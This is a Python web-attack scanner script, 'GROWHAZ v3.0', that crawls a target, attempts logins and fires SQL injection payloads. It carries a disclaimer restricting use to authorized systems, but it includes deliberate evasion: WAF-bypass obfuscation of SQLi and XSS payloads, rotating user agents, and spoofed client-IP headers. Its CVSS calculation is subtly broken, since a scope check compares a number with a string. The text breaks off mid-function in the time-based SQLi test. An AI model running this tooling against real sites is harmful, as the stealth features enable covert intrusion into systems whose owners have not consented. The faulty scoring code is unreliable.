#!/usr/bin/env python3
"""
GROWHAZ Professional Security Testing Tool v3.0
- Deep site mapping (100+ endpoints) with JavaScript crawling
- Stealth mode: header rotation, IP spoofing, adaptive throttling
- Payload obfuscation for SQLi/XSS to bypass WAFs
- Circuit breaker – stops testing endpoints after repeated blocks
- Uses actual discovered parameters (no blind guessing)
- Multithreaded XSS testing (10 workers)
- High‑fidelity evidence (raw requests/responses, unique test ID)
- CVSS v3.1 scoring and OWASP Top 10 mapping
- Detailed test status in final report (pass/fail/blocked/error)
- Supabase integration with specific report ID
- Always returns exit code 0 for GitHub Actions

For educational purposes only. Use only on authorized systems.
"""

import requests
import json
import sys
import time
import re
import datetime
import ssl
import socket
import os
import random
import uuid
import concurrent.futures
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from cryptography import x509
from cryptography.hazmat.backends import default_backend

# Optional Playwright import
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ----------------------------------------------------------------------
# CVSS Scoring Helper
# ----------------------------------------------------------------------
def calculate_cvss_base(vuln_type, attack_vector="network", attack_complexity="low",
                        privileges_required="none", user_interaction="none", scope="unchanged",
                        confidentiality="high", integrity="high", availability="none"):
    """
    Simplified CVSS v3.1 base score calculator.
    Returns a numeric score (0-10) based on the given metrics.
    Defaults are set for SQLi (critical) but can be overridden per vuln.
    """
    # Metric values to numbers mapping (CVSS v3.1)
    av = {"network": 0.85, "adjacent": 0.62, "local": 0.55, "physical": 0.2}
    ac = {"low": 0.77, "high": 0.44}
    pr = {"none": 0.85, "low": 0.62, "high": 0.27}
    ui = {"none": 0.85, "required": 0.62}
    s = {"unchanged": 6.42, "changed": 7.52}  # impact sub-formula constants
    c = {"none": 0, "low": 0.22, "high": 0.56}
    i = {"none": 0, "low": 0.22, "high": 0.56}
    a = {"none": 0, "low": 0.22, "high": 0.56}

    # Impact sub-score (ISS)
    iss = 1 - ((1 - c[confidentiality]) * (1 - i[integrity]) * (1 - a[availability]))
    # Impact
    impact = s[scope] * iss
    # Exploitability
    exploitability = 8.22 * av[attack_vector] * ac[attack_complexity] * pr[privileges_required] * ui[user_interaction]
    # Base score
    if impact <= 0:
        base = 0
    else:
        if s[scope] == "unchanged":
            base = min(impact + exploitability, 10)
        else:
            base = min(1.08 * (impact + exploitability), 10)
    return round(base, 1)

# Map vulnerability types to typical CVSS metrics
VULN_CVSS_MAP = {
    "SQL Injection": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "high",
        "availability": "none"
    },
    "Cross-Site Scripting (XSS)": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "required",
        "scope": "changed",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "IDOR": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "low",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "Directory Traversal": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "CORS Misconfiguration": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "Missing Rate Limiting": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "low"
    },
    "Weak Password Policy": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "high",
        "availability": "high"
    },
    "User Enumeration": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "none",
        "availability": "none"
    },
    "Missing Security Header": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "none",
        "integrity": "none",
        "availability": "none"
    },
    "Server Version Disclosure": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "none",
        "availability": "none"
    },
    "Technology Disclosure": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "none",
        "availability": "none"
    },
    "Expired SSL Certificate": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "changed",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "Weak SSL Cipher": {
        "attack_vector": "adjacent",
        "attack_complexity": "high",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "Outdated TLS Version": {
        "attack_vector": "adjacent",
        "attack_complexity": "high",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    },
    "CSRF / Missing Authentication": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "required",
        "scope": "unchanged",
        "confidentiality": "low",
        "integrity": "low",
        "availability": "none"
    },
    "Open Redirect": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "required",
        "scope": "unchanged",
        "confidentiality": "none",
        "integrity": "low",
        "availability": "none"
    },
    "Sensitive Data Exposure": {
        "attack_vector": "network",
        "attack_complexity": "low",
        "privileges_required": "none",
        "user_interaction": "none",
        "scope": "unchanged",
        "confidentiality": "high",
        "integrity": "none",
        "availability": "none"
    }
}

OWASP_MAP = {
    "SQL Injection": "A03:2021 – Injection",
    "Cross-Site Scripting (XSS)": "A03:2021 – Injection",
    "IDOR": "A01:2021 – Broken Access Control",
    "Directory Traversal": "A01:2021 – Broken Access Control",
    "CORS Misconfiguration": "A05:2021 – Security Misconfiguration",
    "Missing Rate Limiting": "A04:2021 – Insecure Design",
    "Weak Password Policy": "A07:2021 – Identification and Authentication Failures",
    "User Enumeration": "A07:2021 – Identification and Authentication Failures",
    "Missing Security Header": "A05:2021 – Security Misconfiguration",
    "Server Version Disclosure": "A05:2021 – Security Misconfiguration",
    "Technology Disclosure": "A05:2021 – Security Misconfiguration",
    "Expired SSL Certificate": "A05:2021 – Security Misconfiguration",
    "Weak SSL Cipher": "A05:2021 – Security Misconfiguration",
    "Outdated TLS Version": "A05:2021 – Security Misconfiguration",
    "CSRF / Missing Authentication": "A07:2021 – Identification and Authentication Failures",
    "Open Redirect": "A08:2021 – Software and Data Integrity Failures",
    "Sensitive Data Exposure": "A02:2021 – Cryptographic Failures"
}

# ----------------------------------------------------------------------
# Payload obfuscation helpers
# ----------------------------------------------------------------------
def obfuscate_sql_payload(payload):
    """Randomly insert comments and toggle case to bypass simple WAFs."""
    if random.choice([True, False]):
        # Insert SQL comments between keywords
        payload = re.sub(r'\s+', '/**/', payload)
    if random.choice([True, False]):
        # URL encode some characters
        payload = quote(payload, safe='')
    if random.choice([True, False]) and any(k in payload.lower() for k in ['or', 'and', 'select', 'union']):
        # Toggle case for common keywords
        def random_case(m):
            s = m.group(0)
            return ''.join(random.choice([c.upper(), c.lower()]) for c in s)
        payload = re.sub(r'(?i)\b(or|and|select|union|where|from)\b', random_case, payload)
    return payload

def obfuscate_xss_payload(payload):
    """Apply simple XSS obfuscations."""
    if random.choice([True, False]):
        # Mixed case
        payload = ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    if random.choice([True, False]):
        # URL encode some characters
        payload = quote(payload, safe='')
    return payload

# ----------------------------------------------------------------------
# Stealth headers
# ----------------------------------------------------------------------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
]

def random_ip():
    """Generate a random internal IP (for spoofing)."""
    return f"{random.randint(10, 172)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def get_stealth_headers():
    """Return a dictionary of headers for WAF bypass."""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': random_ip(),
        'X-Real-IP': random_ip(),
        'X-Originating-IP': random_ip(),
        'X-Remote-IP': random_ip(),
        'X-Remote-Addr': random_ip(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

# ----------------------------------------------------------------------
# Main SecurityTester class
# ----------------------------------------------------------------------
class SecurityTester:
    def __init__(self, base_url, report_id=None, test_email=None, openapi_spec=None, use_js=False):
        self.base_url = base_url.rstrip('/')
        self.report_id = report_id or os.getenv('REPORT_ID')
        self.test_email = test_email or os.getenv('TEST_EMAIL', "test@example.com")
        self.test_password = os.getenv('TEST_PASSWORD', "Test123!")
        self.session = requests.Session()
        self.results = []                     # List of found vulnerabilities
        self.test_summary = {}                 # Dict with per-test status and details
        self.auth_token = None
        self.discovered_endpoints = {}         # {url: {method: [params]}}
        self.baseline_times = {}                # {endpoint_key: avg_time}
        self.openapi_spec = openapi_spec
        self.use_js = use_js
        self.supabase_url = os.getenv('SUPABASE_URL')
        self.supabase_key = os.getenv('SUPABASE_KEY')
        self.test_run_id = str(uuid.uuid4())   # unique ID for this run
        
        # Print configuration for debugging
        self.log(f"Initialized scanner for {base_url}")
        self.log(f"Report ID: {self.report_id}")
        self.log(f"Test Run ID: {self.test_run_id}")
        self.log(f"Supabase URL configured: {'Yes' if self.supabase_url else 'No'}")
        self.log(f"Supabase Key configured: {'Yes' if self.supabase_key else 'No'}")

    # ----------------------------------------------------------------------
    # Helper methods
    # ----------------------------------------------------------------------
    def log(self, message, status="INFO"):
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{status}] {message}")

    def _throttle(self):
        """Randomized Gaussian delay between 1.5 and 4.0 seconds."""
        delay = random.gauss(2.75, 0.8)
        delay = max(1.5, min(4.0, delay))
        time.sleep(delay)

    def _request(self, method, url, **kwargs):
        """
        Wrapper for requests with stealth headers and throttling.
        Also captures request details for evidence if needed.
        """
        self._throttle()
        headers = get_stealth_headers()
        # Merge with any existing session headers (like auth)
        session_headers = self.session.headers
        headers.update(session_headers)
        if 'headers' in kwargs:
            headers.update(kwargs['headers'])
        kwargs['headers'] = headers

        # Prepare request info for logging
        req_info = {
            'method': method.upper(),
            'url': url,
            'headers': dict(headers),
            'body': kwargs.get('json') or kwargs.get('data') or None
        }

        try:
            resp = self.session.request(method, url, **kwargs)
            # Attach request info to response for later use
            resp._request_info = req_info
            return resp
        except Exception as e:
            self.log(f"Request error: {e}", "ERROR")
            raise

    def calculate_risk_level(self):
        """Calculate risk level based on vulnerabilities found"""
        if not self.results:
            return "low"
        
        # Count critical vulnerabilities (CVSS >= 7.0)
        critical_count = sum(1 for v in self.results if v.get('cvss_score', 0) >= 7.0)
        
        if critical_count > 0:
            return "high"
        elif len(self.results) > 3:
            return "medium"
        else:
            return "low"

    def save_report(self):
        """Save report locally and upload to Supabase"""
        risk_level = self.calculate_risk_level()
        
        report = {
            "base_url": self.base_url,
            "test_run_id": self.test_run_id,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": self.results,
            "test_summary": self.test_summary,
            "summary": {
                "total_vulnerabilities": len(self.results),
                "risk_level": risk_level,
                "scan_completed": True,
                "blocked_tests": sum(1 for v in self.results if v.get('blocked', False))
            }
        }
        
        # Save JSON report
        try:
            with open("security_report.json", "w") as f:
                json.dump(report, f, indent=2)
            self.log("✅ Detailed report saved to 'security_report.json'")
        except Exception as e:
            self.log(f"❌ Error saving report: {e}", "ERROR")
        
        # Upload to Supabase with report_id
        self.send_report_to_supabase(report, risk_level)
        
        # Generate Markdown report for GitHub Actions
        self.save_markdown_report(risk_level)

    def save_markdown_report(self, risk_level):
        """Generate a markdown report for GitHub Actions"""
        try:
            with open("security_report.md", "w") as f:
                f.write("# 🔐 Security Test Report\n\n")
                f.write(f"**Target URL:** {self.base_url}\n\n")
                f.write(f"**Timestamp:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"**Report ID:** {self.report_id}\n")
                f.write(f"**Test Run ID:** {self.test_run_id}\n\n")
                
                # Summary section
                f.write("## 📊 Summary\n\n")
                f.write(f"- **Total Vulnerabilities:** {len(self.results)}\n")
                f.write(f"- **Risk Level:** {risk_level.upper()}\n\n")
                
                # Test summary table
                f.write("## 🧪 Test Results\n\n")
                f.write("| Test | Status | Details |\n")
                f.write("|------|--------|--------|\n")
                for test_name, status_info in self.test_summary.items():
                    status = status_info.get('status', 'UNKNOWN')
                    details = status_info.get('details', '')
                    emoji = "❌" if status == "VULNERABLE" else "✅" if status == "SECURE" else "🚧" if status == "BLOCKED" else "⚠️"
                    f.write(f"| {test_name} | {emoji} {status} | {details} |\n")
                f.write("\n")
                
                # Vulnerabilities section
                if self.results:
                    f.write("## 🚨 Vulnerabilities Found\n\n")
                    for i, vuln in enumerate(self.results, 1):
                        vuln_type = vuln.get('vulnerability', 'Unknown')
                        f.write(f"### {i}. {vuln_type}\n")
                        
                        # Create a table for vulnerability details
                        f.write("| Field | Value |\n")
                        f.write("|-------|-------|\n")
                        
                        for key, value in vuln.items():
                            if key != 'vulnerability':
                                # Format the value for better readability
                                if isinstance(value, dict) or isinstance(value, list):
                                    value = json.dumps(value, indent=2)
                                f.write(f"| {key} | `{value}` |\n")
                        f.write("\n")
                else:
                    f.write("## ✅ No Vulnerabilities Found\n\n")
                    f.write("Great! No security issues were detected during this scan.\n\n")
                
                # Footer
                f.write("---\n")
                f.write("*Report generated by GROWHAZ Professional Security Scanner v3.0*\n")
            
            self.log("✅ Markdown report saved to 'security_report.md'")
        except Exception as e:
            self.log(f"❌ Error saving markdown report: {e}", "ERROR")

    def send_report_to_supabase(self, report, risk_level):
        """Upload the report to Supabase using the specific report ID."""
        if not self.supabase_url or not self.supabase_key:
            self.log("⚠️ Supabase credentials not found. Skipping upload.", "WARNING")
            return
        
        if not self.report_id:
            self.log("⚠️ Report ID not found. Cannot update specific report.", "WARNING")
            self.log("Available env vars: REPORT_ID=" + os.getenv('REPORT_ID', 'not set'))
            return

        endpoint = f"{self.supabase_url}/rest/v1/security_reports?id=eq.{self.report_id}"
        headers = {
            "apikey": self.supabase_key,
            "Authorization": f"Bearer {self.supabase_key}",
            "Content-Type": "application/json",
            "Prefer": "return=representation"
        }
        
        vuln_counts = {}
        for vuln in self.results:
            vuln_type = vuln.get('vulnerability', 'Unknown')
            vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + 1
        
        data = {
            "report_data": report,
            "report_status": "completed",
            "vulnerabilities_found": len(self.results),
            "risk_level": risk_level,
            "scanned_at": datetime.datetime.now().isoformat()
        }
        
        try:
            self.log(f"📤 Uploading report to Supabase (ID: {self.report_id})...")
            r = requests.patch(endpoint, headers=headers, json=data)
            
            if r.status_code in [200, 204]:
                self.log(f"✅ Report updated successfully in Supabase!")
                self.log(f"   - Vulnerabilities found: {len(self.results)}")
                self.log(f"   - Risk level: {risk_level}")
                
                if vuln_counts:
                    self.log("   - Breakdown:")
                    for v_type, count in vuln_counts.items():
                        self.log(f"     • {v_type}: {count}")
            else:
                self.log(f"❌ Failed to update Supabase: {r.status_code}", "ERROR")
                self.log(f"Response: {r.text[:200]}")
                
        except Exception as e:
            self.log(f"❌ Error uploading report to Supabase: {e}", "ERROR")

    # ----------------------------------------------------------------------
    # WAF / blocking detection
    # ----------------------------------------------------------------------
    def is_blocked(self, response):
        """Check if the request was blocked by a firewall or bot‑protection."""
        if response.status_code in [403, 406, 429]:
            return True

        waf_signatures = ['cloudflare', 'akamai', 'datadome', 'incapsula', 'aws-waf', 'cloudfront']
        server_header = response.headers.get('Server', '').lower()
        if any(waf in server_header for waf in waf_signatures) and response.status_code >= 400:
            return True

        html_content = response.text.lower()
        block_keywords = [
            'captcha', 'access denied', 'please verify you are a human',
            'security challenge', 'robot', 'blocked', 'rate limit exceeded'
        ]
        if any(keyword in html_content for keyword in block_keywords):
            return True

        return False

    # ----------------------------------------------------------------------
    # Baseline measurement (uses _request for stealth)
    # ----------------------------------------------------------------------
    def measure_baseline(self, endpoint, method='GET', params=None, data=None, json_data=None, samples=3):
        """Send normal requests to the endpoint and return average response time."""
        key = f"{method}:{endpoint}"
        if params:
            key += f":{sorted(params.items())}"
        if data:
            key += f":{sorted(data.items())}"
        if json_data:
            key += f":{sorted(json_data.items())}"

        if key in self.baseline_times:
            return self.baseline_times[key]

        times = []
        for _ in range(samples):
            try:
                start = time.time()
                if method.upper() == 'GET':
                    self._request('GET', endpoint, params=params, timeout=3)
                elif method.upper() == 'POST':
                    if json_data:
                        self._request('POST', endpoint, json=json_data, timeout=3)
                    else:
                        self._request('POST', endpoint, data=data, timeout=3)
                elapsed = time.time() - start
                times.append(elapsed)
            except Exception:
                pass
            time.sleep(0.2)

        avg_time = sum(times) / len(times) if times else 1.0
        self.baseline_times[key] = avg_time
        return avg_time

    # ----------------------------------------------------------------------
    # Deep site mapping (scalable crawling)
    # ----------------------------------------------------------------------
    def crawl_static(self, start_url=None, max_pages=100):
        self.log("🕷️ Starting static web crawler (no JavaScript)...")
        to_visit = [start_url or self.base_url]
        visited = set()
        forms_found = []
        endpoints_found = set()

        # Common API paths to probe
        api_paths = ['/api', '/api/v1', '/api/v2', '/graphql', '/rest', '/swagger', '/openapi.json']

        while to_visit and len(visited) < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)

            try:
                response = self._request('GET', url, timeout=3)
                if 'text/html' not in response.headers.get('Content-Type', ''):
                    continue

                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Find forms
                for form in soup.find_all('form'):
                    action = form.get('action')
                    if action:
                        full_action = urljoin(url, action)
                        method = form.get('method', 'get').upper()
                        inputs = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')]
                        forms_found.append({'url': full_action, 'method': method, 'inputs': inputs})
                        endpoints_found.add(full_action)
                        if full_action not in self.discovered_endpoints:
                            self.discovered_endpoints[full_action] = {}
                        if method not in self.discovered_endpoints[full_action]:
                            self.discovered_endpoints[full_action][method] = set()
                        self.discovered_endpoints[full_action][method].update(inputs)

                # Find links
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    if full_url.startswith(self.base_url) and full_url not in visited and full_url not in to_visit:
                        to_visit.append(full_url)
                        endpoints_found.add(full_url)

                # Also add potential API endpoints from links
                parsed = urlparse(url)
                for path in api_paths:
                    api_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                    if api_url not in visited and api_url not in to_visit:
                        to_visit.append(api_url)
                        
            except Exception as e:
                self.log(f"Error crawling {url}: {e}", "ERROR")

        self.log(f"✅ Static crawling finished. Discovered {len(endpoints_found)} endpoints, {len(forms_found)} forms.")
        return forms_found

    def crawl_with_playwright(self, start_url=None, max_pages=100):
        if not PLAYWRIGHT_AVAILABLE:
            self.log("⚠️ Playwright not installed. Falling back to static crawler.", "WARNING")
            return self.crawl_static(start_url, max_pages)

        self.log("🕷️ Starting JavaScript‑enabled crawler with Playwright...")
        forms_found = []
        visited = set()
        to_visit = [start_url or self.base_url]
        endpoints_found = set()

        api_paths = ['/api', '/api/v1', '/api/v2', '/graphql', '/rest', '/swagger', '/openapi.json']

        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()

                # Capture all network requests to find API endpoints
                requests_seen = set()
                def handle_request(request):
                    if request.url.startswith(self.base_url) and request.url not in requests_seen:
                        requests_seen.add(request.url)
                        endpoints_found.add(request.url)
                page.on('request', handle_request)

                while to_visit and len(visited) < max_pages:
                    url = to_visit.pop(0)
                    if url in visited:
                        continue
                    visited.add(url)

                    try:
                        page.goto(url, wait_until='networkidle', timeout=10000)
                        html = page.content()
                        soup = BeautifulSoup(html, 'html.parser')

                        # Find forms
                        for form in soup.find_all('form'):
                            action = form.get('action')
                            if action:
                                full_action = urljoin(url, action)
                                method = form.get('method', 'get').upper()
                                inputs = [inp.get('name') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')]
                                forms_found.append({'url': full_action, 'method': method, 'inputs': inputs})
                                endpoints_found.add(full_action)
                                if full_action not in self.discovered_endpoints:
                                    self.discovered_endpoints[full_action] = {}
                                if method not in self.discovered_endpoints[full_action]:
                                    self.discovered_endpoints[full_action][method] = set()
                                self.discovered_endpoints[full_action][method].update(inputs)

                        # Find links
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            full_url = urljoin(url, href)
                            if full_url.startswith(self.base_url) and full_url not in visited and full_url not in to_visit:
                                to_visit.append(full_url)
                                endpoints_found.add(full_url)

                    except Exception as e:
                        self.log(f"Error crawling {url} with Playwright: {e}", "ERROR")

                # After crawling, add API paths to to_visit if not already visited
                parsed = urlparse(self.base_url)
                for path in api_paths:
                    api_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                    if api_url not in visited:
                        endpoints_found.add(api_url)
                        # Optionally visit it to parse any HTML response (if any)
                        to_visit.append(api_url)

                browser.close()
        except Exception as e:
            self.log(f"❌ Playwright error: {e}", "ERROR")
            return self.crawl_static(start_url, max_pages)

        self.log(f"✅ JavaScript crawling finished. Discovered {len(endpoints_found)} endpoints, {len(forms_found)} forms.")
        return forms_found

    def discover_endpoints(self):
        """Discover endpoints through crawling and OpenAPI"""
        self.log("🔍 Discovering endpoints...")
        
        if self.openapi_spec and os.path.exists(self.openapi_spec):
            self.load_openapi_spec()
            
        if self.use_js:
            self.crawl_with_playwright(max_pages=100)
        else:
            self.crawl_static(max_pages=100)
            
        self.log(f"✅ Total endpoints discovered: {len(self.discovered_endpoints)}")

    def load_openapi_spec(self):
        """Load endpoints from OpenAPI/Swagger spec"""
        if not self.openapi_spec:
            return
        try:
            with open(self.openapi_spec, 'r') as f:
                spec = json.load(f)
            paths = spec.get('paths', {})
            for path, methods in paths.items():
                full_url = urljoin(self.base_url, path)
                for method, details in methods.items():
                    method = method.upper()
                    parameters = []
                    for param in details.get('parameters', []):
                        if param.get('in') in ['query', 'path']:
                            parameters.append(param['name'])
                    if 'requestBody' in details:
                        content = details['requestBody'].get('content', {})
                        if 'application/json' in content:
                            schema = content['application/json'].get('schema', {})
                            if 'properties' in schema:
                                parameters.extend(schema['properties'].keys())
                    if full_url not in self.discovered_endpoints:
                        self.discovered_endpoints[full_url] = {}
                    if method not in self.discovered_endpoints[full_url]:
                        self.discovered_endpoints[full_url][method] = set()
                    self.discovered_endpoints[full_url][method].update(parameters)
            self.log(f"✅ Loaded {len(paths)} endpoints from OpenAPI spec.")
        except Exception as e:
            self.log(f"❌ Error loading OpenAPI spec: {e}", "ERROR")

    # ----------------------------------------------------------------------
    # Login attempt (uses _request)
    # ----------------------------------------------------------------------
    def attempt_login(self):
        """Attempt to login to get auth token for deeper testing"""
        self.log("🔑 Attempting login for post-authentication tests...")
        login_url = f"{self.base_url}/api/login"
        data = {"email": self.test_email, "password": self.test_password}
        
        alternative_logins = [
            f"{self.base_url}/login",
            f"{self.base_url}/auth/login",
            f"{self.base_url}/api/auth/login",
            f"{self.base_url}/user/login"
        ]
        
        all_login_urls = [login_url] + alternative_logins
        
        for login_url in all_login_urls:
            try:
                response = self._request('POST', login_url, json=data, timeout=3)
                
                if self.is_blocked(response):
                    self.log("⚠️ Login attempt was blocked by WAF.", "WARNING")
                    continue
                    
                if response.status_code == 200:
                    try:
                        resp_json = response.json()
                        self.auth_token = resp_json.get("token") or resp_json.get("access_token") or resp_json.get("jwt")
                        if self.auth_token:
                            self.session.headers.update({"Authorization": f"Bearer {self.auth_token}"})
                            self.log("✅ Login successful! Auth token acquired.")
                            return True
                        else:
                            self.log("✅ Login successful, using session cookies.")
                            return True
                    except:
                        self.log("✅ Login successful (non-JSON response).")
                        return True
                else:
                    self.log(f"Login failed on {login_url}: {response.status_code}")
                    
            except Exception as e:
                self.log(f"Error during login attempt on {login_url}: {e}", "ERROR")
                continue
                
        self.log("⚠️ Could not login. Continuing with unauthenticated tests.")
        return False

    # ----------------------------------------------------------------------
    # Helper to add vulnerability with CVSS and OWASP
    # ----------------------------------------------------------------------
    def add_vulnerability(self, vuln_type, endpoint, payload=None, parameter=None,
                          request=None, response=None, cvss_override=None):
        """Create a detailed vulnerability entry and append to results."""
        # Get base CVSS metrics from map or use defaults
        metrics = VULN_CVSS_MAP.get(vuln_type, VULN_CVSS_MAP["SQL Injection"])  # fallback to critical
        cvss_score = cvss_override if cvss_override is not None else calculate_cvss_base(vuln_type, **metrics)
        owasp = OWASP_MAP.get(vuln_type, "Unknown")

        vuln = {
            "vulnerability": vuln_type,
            "endpoint": endpoint,
            "cvss_score": cvss_score,
            "owasp": owasp,
            "test_run_id": self.test_run_id,
            "timestamp": datetime.datetime.now().isoformat()
        }
        if payload:
            vuln["payload"] = payload
        if parameter:
            vuln["parameter"] = parameter
        if request:
            vuln["raw_request"] = request
        if response:
            vuln["raw_response"] = response

        self.results.append(vuln)

    # ----------------------------------------------------------------------
    # SQL Injection test (enhanced with obfuscation, circuit breaker, and evidence)
    # ----------------------------------------------------------------------
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        self.log("🔍 Testing SQL Injection...")
        vulnerable = False
        test_details = []

        # Safe payloads (no destructive commands)
        boolean_payloads = [
            ("' OR '1'='1", "' OR '1'='2"),
            ("' OR 1=1 --", "' OR 1=2 --"),
            ("' AND '1'='1", "' AND '1'='2"),
        ]
        time_payloads = [
            ("' OR SLEEP(5) --", 5),
            ("' AND SLEEP(5) --", 5),
            ("'; WAITFOR DELAY '00:00:05' --", 5),  # MSSQL
        ]
        error_payloads = ["'", "\"", "\\", "'\"`", "';--"]

        # Build test endpoints from discovered ones + common ones
        test_endpoints = set()
        for url, methods in self.discovered_endpoints.items():
            if 'POST' in methods:
                test_endpoints.add(url)
        common = ["/api/login", "/api/register", "/api/search", "/api/contact", "/search", "/contact"]
        for path in common:
            test_endpoints.add(urljoin(self.base_url, path))

        for endpoint in test_endpoints:
            self.log(f"  Testing SQLi on {endpoint}")
            endpoint_result = {"endpoint": endpoint, "status": "secure", "details": ""}
            consecutive_blocks = 0

            # Measure baseline
            baseline_json = {"email": "nonexistent@example.com", "password": "wrongpassword"}
            baseline_time = self.measure_baseline(endpoint, method='POST', json_data=baseline_json)

            # Boolean-based tests
            for true_payload, false_payload in boolean_payloads:
                if consecutive_blocks >= 3:
                    self.log(f"    Circuit breaker tripped after 3 blocks. Skipping remaining payloads.")
                    endpoint_result["status"] = "blocked"
                    endpoint_result["details"] = "WAF blocked multiple requests"
                    break
                # Obfuscate payloads
                true_payload_obs = obfuscate_sql_payload(true_payload)
                false_payload_obs = obfuscate_sql_payload(false_payload)
                try:
                    true_data = {"email": true_payload_obs, "password": "anything"}
                    resp_true = self._request('POST', endpoint, json=true_data, timeout=5)
                    if self.is_blocked(resp_true):
                        consecutive_blocks += 1
                        continue

                    false_data = {"email": false_payload_obs, "password": "anything"}
                    resp_false = self._request('POST', endpoint, json=false_data, timeout=5)
                    if self.is_blocked(resp_false):
                        consecutive_blocks += 1
                        continue

                    consecutive_blocks = 0

                    if (resp_true.status_code != resp_false.status_code) or \
                       (len(resp_true.text) != len(resp_false.text)):
                        self.log(f"    ⚠️ Boolean-based SQLi possible at {endpoint}", "WARNING")
                        vulnerable = True
                        self.add_vulnerability(
                            vuln_type="SQL Injection (Boolean-based)",
                            endpoint=endpoint,
                            payload=true_payload_obs,
                            parameter="email",
                            request=resp_true._request_info,
                            response={
                                'status_code': resp_true.status_code,
                                'headers': dict(resp_true.headers),
                                'body_snippet': resp_true.text[:500]
                            }
                        )
                        endpoint_result["status"] = "vulnerable"
                        endpoint_result["details"] = f"Boolean-based SQLi with payload: {true_payload}"
                        break
                except Exception as e:
                    continue

            # Time-based tests
            for payload, delay in time_payloads:
                if consecutive_blocks >= 3:
                    break
                payload_obs = obfuscate_sql_payload(payload)
                try:
